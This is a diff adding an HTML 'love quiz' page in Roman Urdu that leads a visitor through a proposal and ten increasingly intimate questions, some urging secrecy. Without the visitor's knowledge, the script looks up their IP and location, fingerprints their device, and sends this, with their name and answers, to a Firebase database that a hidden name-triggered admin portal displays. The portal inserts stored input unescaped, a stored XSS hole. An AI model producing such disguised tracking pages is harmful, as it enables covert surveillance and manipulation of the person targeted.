@@ -1,0 +1,437 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sirf Tumhare Liye ❤️</title>
+    
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
+
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Dancing+Script:wght@700&family=Quicksand:wght@400;600&display=swap');
+
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        
+        body {
+            background: #000;
+            color: white;
+            font-family: 'Quicksand', sans-serif;
+            height: 100vh;
+            width: 100vw;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden; /* Fix for scrolling */
+            position: relative;
+            padding: 10px;
+        }
+
+        /* Login & Admin Styles */
+        #login-screen { z-index: 100; text-align: center; width: 100%; max-width: 400px; }
+        .login-input { width: 100%; padding: 15px; border-radius: 25px; border: 1px solid #ff2d55; background: #111; color: white; margin-bottom: 20px; text-align: center; }
+        #admin-portal { display: none; z-index: 100; width: 100%; max-width: 800px; background: #111; padding: 20px; border-radius: 20px; border: 1px solid #ff2d55; max-height: 90vh; overflow-y: auto; }
+        
+        /* New Admin Box Style */
+        .user-card-box { background: #1a1a1a; padding: 15px; border-radius: 12px; margin-bottom: 10px; border-left: 4px solid #ff2d55; cursor: pointer; position: relative; }
+        .details-content { display: none; margin-top: 10px; border-top: 1px solid #333; padding-top: 10px; }
+        .del-this { position: absolute; right: 10px; top: 10px; background: red; color: white; border: none; padding: 4px 8px; border-radius: 4px; font-size: 10px; cursor: pointer; }
+
+        .ans-row { padding: 8px; margin: 5px 0; border-radius: 8px; border: 1px solid rgba(255,255,255,0.1); }
+        .sa-style { background: rgba(255, 45, 85, 0.2); border-color: #ff2d55; }
+        .a-style { background: rgba(0, 255, 0, 0.1); border-color: #00ff00; }
+        .n-style { background: rgba(0, 0, 255, 0.1); border-color: #0000ff; }
+        .d-style { background: rgba(255, 165, 0, 0.1); border-color: #ffa500; }
+        .sd-style { background: rgba(255, 0, 0, 0.1); border-color: #ff0000; }
+
+        /* Floating Hearts */
+        .heart {
+            position: absolute;
+            color: rgba(255, 45, 85, 0.4);
+            font-size: 20px;
+            pointer-events: none;
+            animation: floatUp 5s linear infinite;
+            z-index: 5;
+        }
+        @keyframes floatUp {
+            0% { transform: translateY(110vh) rotate(0deg); opacity: 1; }
+            100% { transform: translateY(-10vh) rotate(360deg); opacity: 0; }
+        }
+
+        .container {
+            display: none;
+            width: 100%;
+            max-width: 500px;
+            text-align: center;
+            z-index: 10;
+        }
+
+        #countdown-screen { font-size: clamp(4rem, 15vw, 8rem); color: #ff2d55; font-family: 'Dancing Script'; text-shadow: 0 0 20px #ff2d55; }
+        #gift-screen { display: none; cursor: pointer; animation: zoomIn 0.8s; }
+        .gift-box { font-size: clamp(80px, 20vw, 120px); filter: drop-shadow(0 0 30px #ff2d55); }
+        #propose-screen { display: none; animation: fadeIn 1.5s; }
+        .rose { font-size: clamp(60px, 15vw, 100px); animation: glow 2s infinite; }
+        @keyframes glow { 0%, 100% { filter: drop-shadow(0 0 15px #ff2d55); } 50% { filter: drop-shadow(0 0 40px #ff2d55); } }
+
+        #quiz-screen {
+            display: none;
+            width: 100%;
+            background: linear-gradient(rgba(0,0,0,0.6), rgba(0,0,0,0.6)), 
+                        url('https://images.unsplash.com/photo-1518199266791-5375a83190b7?q=80&w=1000&auto=format&fit=crop'); 
+            background-size: cover;
+            background-position: center;
+            border-radius: 30px;
+            padding: 20px;
+            border: 2px solid rgba(255, 45, 85, 0.5);
+            animation: fadeIn 1s;
+            flex-direction: column;
+            justify-content: center;
+            font-family: 'Times New Roman', Times, serif;
+        }
+
+        #q-text {
+            font-family: 'Times New Roman', Times, serif;
+            font-size: clamp(1.1rem, 5vw, 1.6rem);
+            line-height: 1.3;
+            margin-bottom: 20px;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.9);
+            color: #fff;
+            font-weight: bold;
+        }
+
+        .options { display: flex; flex-direction: column; gap: 8px; margin-bottom: 15px; width: 100%; }
+        .option-label {
+            background: rgba(255, 255, 255, 0.15);
+            backdrop-filter: blur(10px);
+            padding: 10px;
+            border-radius: 15px;
+            cursor: pointer;
+            transition: 0.3s;
+            font-size: clamp(0.85rem, 4vw, 1rem);
+            border: 1px solid rgba(255,255,255,0.2);
+            font-weight: 500;
+            font-family: 'Times New Roman', Times, serif;
+        }
+
+        input[type="radio"] { display: none; }
+        input[type="radio"]:checked + .option-label { 
+            background: #ff2d55; 
+            border-color: #fff;
+        }
+        
+        textarea {
+            width: 100%; 
+            background: rgba(0,0,0,0.7); 
+            border: 1px solid rgba(255, 45, 85, 0.4);
+            padding: 10px; 
+            color: white; 
+            border-radius: 15px; 
+            resize: none;
+            font-family: 'Times New Roman', Times, serif;
+        }
+
+        .btn {
+            background: linear-gradient(45deg, #ff2d55, #b3002d);
+            border: none; color: white;
+            padding: 12px 30px; border-radius: 50px; cursor: pointer;
+            margin-top: 10px; font-weight: bold;
+            display: block;
+            width: 100%;
+            max-width: 250px;
+            margin-left: auto;
+            margin-right: auto;
+            font-family: 'Quicksand', sans-serif;
+        }
+
+        #final-screen { display: none; animation: fadeIn 2s; }
+        #message-prompt-screen { display: none; animation: fadeIn 1s; }
+        #message-input-screen { display: none; animation: fadeIn 1s; }
+
+        @keyframes zoomIn { from { transform: scale(0); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+    </style>
+</head>
+<body>
+
+    <div id="hearts-bg"></div>
+
+    <div id="login-screen">
+        <h2 style="font-family: 'Dancing Script'; font-size: 2.5rem; color: #ff2d55; margin-bottom: 20px;">Apna Naam Batayein...</h2>
+        <input type="text" id="userNameInput" class="login-input" placeholder="Enter Name">
+        <button class="btn" onclick="checkLogin()">Pehchan Karwaein</button>
+    </div>
+
+    <div id="admin-portal">
+        <h2 style="color: #ff2d55; margin-bottom: 20px; font-family: 'Dancing Script'; font-size: 2.5rem;">Admin Records</h2>
+        <div id="admin-content"></div>
+        <button class="btn" onclick="location.reload()">Logout</button>
+        <button class="btn" style="background: #444;" onclick="clearHistory()">Clear All History</button>
+    </div>
+
+    <div class="container" id="main-container">
+        <div id="countdown-screen">3</div>
+
+        <div id="gift-screen" onclick="showPropose()">
+            <div class="gift-box">🎁</div>
+            <p style="margin-top:20px; letter-spacing: 3px; font-weight: bold;">OPEN YOUR HEART</p>
+        </div>
+
+        <div id="propose-screen">
+            <div class="rose">🌹</div>
+            <h2 style="font-family: 'Dancing Script'; font-size: clamp(2rem, 8vw, 3rem); margin: 20px 0; color: #ff2d55;">Hamesha Mere Rahoge?</h2>
+            <p style="font-style: italic; opacity: 0.9; font-size: clamp(0.9rem, 4vw, 1.2rem); margin-bottom: 20px;">Main har lamha sirf tumhara hona chahta hoon...</p>
+            <button class="btn" onclick="startQuiz('Ji, Bilkul - In Sha Allah')">Ji, Bilkul - In Sha Allah ❤️</button>
+            <button class="btn" onclick="startQuiz('Dakhen Ge')">Dakhen Ge❤️</button>
+            <button class="btn" onclick="startQuiz('Nhi')">Nhi  ❤️</button>
+        </div>
+
+        <div id="quiz-screen">
+            <p id="q-text"></p>
+            <div class="options">
+                <input type="radio" name="opt" id="sa" value="Strongly Agree"><label class="option-label" for="sa">Strongly Agree</label>
+                <input type="radio" name="opt" id="a" value="Agree"><label class="option-label" for="a">Agree</label>
+                <input type="radio" name="opt" id="n" value="Neutral"><label class="option-label" for="n">Neutral</label>
+                <input type="radio" name="opt" id="d" value="Disagree"><label class="option-label" for="d">Disagree</label>
+                <input type="radio" name="opt" id="sd" value="Strongly Disagree"><label class="option-label" for="sd">Strongly Disagree</label>
+            </div>
+            <textarea id="caption" rows="2" placeholder="Write a message for me..."></textarea>
+            <button class="btn" onclick="handleNext()">Next Moment →</button>
+        </div>
+
+        <div id="final-screen">
+            <h2 style="font-family: 'Dancing Script'; font-size: clamp(2.5rem, 10vw, 4rem); color: #ff2d55;">I Love You ❤️</h2>
+            <p style="font-size: 1.2rem; margin-top: 10px;">Hamari nazdeekiyan ab hamesha ke liye hain...</p>
+            <div style="font-size: 4rem; margin-top: 20px;">💋</div>
+            <button class="btn" onclick="alert('Shukria Jaan !'); goToMessagePrompt('In sha allah')"> In sha allah</button>
+            <button class="btn" onclick="alert('Oh... :( Itni dooriyan kyun?'); goToMessagePrompt('lakin m nhi chahta yh nazdeeqian')">lakin m nhi chahta yh nazdeeqian</button>
+            <button class="btn" onclick="alert('Theek hai, hum ahista ahista agay barhein ge. ❤️'); goToMessagePrompt('m chahta hon lakin itni nhi')">m chahta hon lakin itni nhi</button>
+        </div>
+
+        <div id="message-prompt-screen">
+            <h3 style="margin-bottom: 20px;">Kya aap muhib ko apna koi paigham dena chahen ge?</h3>
+            <button class="btn" onclick="showMessageInput()">Haan</button>
+            <button class="btn" style="background: #444;" onclick="location.reload()">Nahi</button>
+        </div>
+
+        <div id="message-input-screen">
+            <textarea id="final-paigham" rows="4" placeholder="Apna paigham yahan likhein..."></textarea>
+            <button class="btn" onclick="submitFinalMessage()">Submit Message</button>
+        </div>
+    </div>
+
+    <script>
+        // --- FIREBASE CONFIG ---
+  const firebaseConfig = {
+    apiKey: "AIzaSyDfZ9zjJjz16hr71YdaOvCf4EKCLMGFmnA",
+    authDomain: "love-quiz-10.firebaseapp.com",
+    databaseURL: "https://love-quiz-10-default-rtdb.firebaseio.com",
+    projectId: "love-quiz-10",
+    storageBucket: "love-quiz-10.firebasestorage.app",
+    messagingSenderId: "817029367754",
+    appId: "1:817029367754:web:6cc4bb61c19fb91c2f3133"
+  };
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+
+        let currentUserName = "";
+        let userResponses = [];
+        let locInfo = "Fetching...";
+        let initialSelection = "";
+        let finalStatusMsg = "";
+        let currentEntryId = ""; // To track the record in Firebase
+
+        fetch('https://ipapi.co/json/').then(res => res.json()).then(data => {
+            locInfo = `${data.city}, ${data.country_name} (${data.ip})`;
+        }).catch(() => locInfo = "Unknown Location");
+
+        function getPakTime() {
+            return new Date().toLocaleString("en-PK", {timeZone: "Asia/Karachi"});
+        }
+
+        function getDetailedDeviceInfo() {
+            const ua = navigator.userAgent;
+            let device = "Generic Device";
+            const cores = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} Cores` : "Unknown Cores";
+            const ram = navigator.deviceMemory ? `${navigator.deviceMemory}GB RAM` : "RAM Hidden";
+            let gpu = "Unknown GPU";
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_ID);
+            } catch(e) {}
+            if(ua.includes("iPhone")) device = "iPhone";
+            else if(ua.includes("Samsung")) device = "Samsung Device";
+            else if(!ua.includes("Mobi")) device = "PC/Desktop (" + navigator.platform + ")";
+            return `${device} | ${window.screen.width}x${window.screen.height} | ${cores} | ${ram} | GPU: ${gpu}`;
+        }
+
+        function checkLogin() {
+            const name = document.getElementById('userNameInput').value.trim();
+            if (!name) return alert("Jaan ❤️ naam to likhen. ❤️");
+            if (name === "Tauseef .") {
+                showAdmin();
+            } else {
+                currentUserName = name;
+                document.getElementById('login-screen').style.display = 'none';
+                document.getElementById('main-container').style.display = 'block';
+                startCountdown();
+            }
+        }
+
+        function showAdmin() {
+            document.getElementById('login-screen').style.display = 'none';
+            document.getElementById('admin-portal').style.display = 'block';
+            loadAdminRecords();
+        }
+
+        function loadAdminRecords() {
+            database.ref('loveHistory').on('value', (snapshot) => {
+                const historyObj = snapshot.val() || {};
+                const history = Object.keys(historyObj).map(key => ({...historyObj[key], id: key}));
+                const container = document.getElementById('admin-content');
+                
+                if (history.length === 0) { container.innerHTML = "<p>No entries yet.</p>"; return; }
+
+                container.innerHTML = history.reverse().map((entry, idx) => `
+                    <div class="user-card-box" onclick="toggleView('${entry.id}')">
+                        <button class="del-this" onclick="deleteSpecific(event, '${entry.id}')">DEL</button>
+                        <b>Response by ( ${entry.name} )</b>
+                        <div id="details-${entry.id}" class="details-content">
+                            <p style="font-size:12px; color:#aaa;">Time: ${entry.time}<br>Loc: ${entry.location}<br>Device: ${entry.device}</p>
+                            <p style="background:rgba(255,45,85,0.1); padding:5px; margin:5px 0; border-radius:5px; font-weight:bold;">First Choice: ${entry.initialAnswer}</p>
+                            <p style="background:rgba(255,45,85,0.3); padding:5px; margin:5px 0; border-radius:5px; font-weight:bold;">Final Response: ${entry.finalChoice || 'Pending'}</p>
+                            ${entry.finalPaigham ? `<p style="color:#ff2d55; font-weight:bold; border:1px dashed #ff2d55; padding:5px; margin:5px 0;">Special Msg: ${entry.finalPaigham}</p>` : ''}
+                            ${entry.answers.map((ans, i) => {
+                                let styleClass = ans.val === "Strongly Agree" ? "sa-style" : (ans.val === "Strongly Disagree" ? "sd-style" : "a-style");
+                                return `<div class="ans-row ${styleClass}">Q${i+1}: ${ans.question}<br>Ans: ${ans.val} ${ans.msg ? `| Msg: "${ans.msg}"` : ""}</div>`;
+                            }).join('')}
+                        </div>
+                    </div>
+                `).join('');
+            });
+        }
+
+        function toggleView(id) {
+            let el = document.getElementById(`details-${id}`);
+            el.style.display = el.style.display === 'block' ? 'none' : 'block';
+        }
+
+        function deleteSpecific(e, id) {
+            e.stopPropagation();
+            if(confirm("Ye record delete kar dein?")) {
+                database.ref('loveHistory/' + id).remove();
+            }
+        }
+
+        const questions = [
+            "Kya aap hamari dosti ko ek aisi kurbat mein badalte dekhna chahte hain jahan lafzon ki jagah sirf ehsaas hon?",
+            "Jab hum bilkul akele hon, kya aapko mere itne kareeb hona pasand hai ke hamari saansein takrayein?",
+            "Kya aap hamari baaton aur mulaqaton ko duniya ki nazron se mukammal chupa kar rakhna chahte hain?",
+            "Jab main aapko kareeb se dekhta hoon, kya aap chahte hain ke main bas khamosh ho kar aap mein kho jaoon?",
+            "Kya aapko lagta hai ke hamari dosti ka agla muqam wo hai jahan hamare darmiyan koi parda na rahe?",
+            "Jab hamari aankhein milti hain, kya aapke dil mein ye khwahish jagti hai ke ye lamha yahin tham jaye?",
+            "Kya agar m dheere se aap ke honton ke qareeb ruk jaon, to kia ap us lamhe ko chahte hain ??",
+            "Kya aap mere sath dosti se barh kar ek aisa talluq chahte hain jahan sirf hamari dhadkanein baatein karein?",
+            "kia ap ko pasand hai jab qurbat sirf baton tak mehdood na rahe ??",
+            "Kya aap tayyar hain us ek khamosh lamhe ke liye jahan hamare hont saari dooriyan mita dein?"
+        ];
+
+        let currentIdx = 0;
+
+        function startCountdown() {
+            let count = 3;
+            const countTimer = setInterval(() => {
+                count--;
+                if(count > 0) document.getElementById('countdown-screen').innerText = count;
+                else {
+                    clearInterval(countTimer);
+                    document.getElementById('countdown-screen').style.display = 'none';
+                    document.getElementById('gift-screen').style.display = 'block';
+                }
+            }, 1200);
+        }
+
+        function showPropose() {
+            document.getElementById('gift-screen').style.display = 'none';
+            document.getElementById('propose-screen').style.display = 'block';
+        }
+
+        function startQuiz(ans) {
+            initialSelection = ans;
+            document.getElementById('propose-screen').style.display = 'none';
+            document.getElementById('quiz-screen').style.display = 'flex';
+            showQuestion();
+        }
+
+        function showQuestion() {
+            document.getElementById('q-text').innerText = questions[currentIdx];
+            document.querySelectorAll('input[name="opt"]').forEach(opt => opt.checked = false);
+            document.getElementById('caption').value = "";
+        }
+
+        function handleNext() {
+            const sel = document.querySelector('input[name="opt"]:checked');
+            if (!sel) return alert("Jaan, aik option select karna laazmi hai ❤️");
+            userResponses.push({ question: questions[currentIdx], val: sel.value, msg: document.getElementById('caption').value });
+            currentIdx++;
+            if (currentIdx < questions.length) showQuestion();
+            else {
+                saveData();
+                document.getElementById('quiz-screen').style.display = 'none';
+                document.getElementById('final-screen').style.display = 'block';
+            }
+        }
+
+        function goToMessagePrompt(status) {
+            finalStatusMsg = status;
+            if(currentEntryId) {
+                database.ref('loveHistory/' + currentEntryId).update({ finalChoice: status });
+            }
+            document.getElementById('final-screen').style.display = 'none';
+            document.getElementById('message-prompt-screen').style.display = 'block';
+        }
+
+        function showMessageInput() {
+            document.getElementById('message-prompt-screen').style.display = 'none';
+            document.getElementById('message-input-screen').style.display = 'block';
+        }
+
+        function submitFinalMessage() {
+            const msg = document.getElementById('final-paigham').value;
+            if(currentEntryId) {
+                database.ref('loveHistory/' + currentEntryId).update({ finalPaigham: msg });
+            }
+            alert("Paigham bhej diya gaya hai! ❤️");
+            location.reload();
+        }
+
+        function saveData() {
+            const entry = { 
+                name: currentUserName, 
+                time: getPakTime(), 
+                location: locInfo, 
+                device: getDetailedDeviceInfo(), 
+                initialAnswer: initialSelection, 
+                answers: userResponses, 
+                finalPaigham: "", 
+                finalChoice: "" 
+            };
+            const newRef = database.ref('loveHistory').push();
+            currentEntryId = newRef.key;
+            newRef.set(entry);
+        }
+
+        function clearHistory() { if(confirm("Clear all data?")) { database.ref('loveHistory').remove(); } }
+
+        setInterval(() => {
+            const h = document.createElement('div');
+            h.classList.add('heart'); h.innerHTML = '❤️';
+            h.style.left = Math.random() * 100 + 'vw';
+            h.style.animationDuration = (Math.random() * 2 + 3) + 's';
+            document.getElementById('hearts-bg').appendChild(h);
+            setTimeout(() => h.remove(), 5000);
+        }, 400);
+    </script>
+</body>
+</html>
